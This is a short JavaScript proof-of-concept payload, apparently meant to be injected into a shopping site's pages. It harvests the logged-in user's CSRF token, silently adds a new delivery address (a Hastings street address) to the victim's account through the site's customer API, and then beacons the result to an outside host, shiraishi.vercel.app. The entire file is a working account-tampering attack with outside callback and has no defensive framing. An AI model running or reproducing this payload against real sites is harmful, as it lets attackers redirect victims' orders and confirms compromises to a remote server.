(async () => {
  const log = (...a) => console.log('[PoC]', ...a);

  const getCsrf = async () => {
    const m = document.querySelector('meta[name="csrf-token"],meta[name="x-csrf-token"]');
    if (m && m.content) return m.content;

    if (window.__NEXT_DATA__ && window.__NEXT_DATA__.props && window.__NEXT_DATA__.props.pageProps) {
      const p = window.__NEXT_DATA__.props.pageProps;
      if (p.csrfToken) return p.csrfToken;
    }

    try {
      const html = await fetch('/en-gb/account/addresses/new', {
        credentials: 'include'
      }).then(r => r.text());

      const patterns = [
        /x-csrf-token["']?\s*[:=]\s*["']([^"']+)["']/i,
        /"csrfToken"\s*:\s*"([^"]+)"/,
        /csrfToken["']?\s*[:=]\s*["']([^"']+)["']/i,
        /<meta[^>]+name=["']csrf-token["'][^>]+content=["']([^"']+)["']/i
      ];

      for (const p of patterns) {
        const match = html.match(p);
        if (match && match[1]) return match[1];
      }
    } catch (e) {
      log('form fetch failed:', e.message);
    }

    return null;
  };

  const token = await getCsrf();
  log('token:', token, 'len:', token ? token.length : 0);
  if (!token || token.length < 30) return;

  const addressId = String(Date.now()) + String(Math.floor(Math.random() * 1000)).padStart(3, '0');

  const body = JSON.stringify({
    item: {
      firstName: "a",
      lastName: "a",
      countryCode: "GB",
      address1: "Kings Barbers, 85 Queens Road",
      address2: "",
      city: "Hastings",
      postalCode: "TN34 1RL",
      phone: "",
      addressId: addressId
    }
  });

  const res = await fetch('/api/customer/address', {
    method: 'POST',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/json',
      'x-csrf-token': token
    },
    body
  }).catch(e => {
    log('fetch failed:', e.message);
    return null;
  });

  if (!res) return;
  log('status:', res.status, 'addressId:', addressId);

  const txt = await res.text().catch(() => '');
  log('response:', txt.slice(0, 500));

  try {
    await fetch('https://shiraishi.vercel.app/log?ok=' + res.status + '&id=' + addressId);
  } catch (e) {
    new Image().src = 'https://shiraishi.vercel.app/log?ok=' + res.status + '&id=' + addressId;
  }
})();
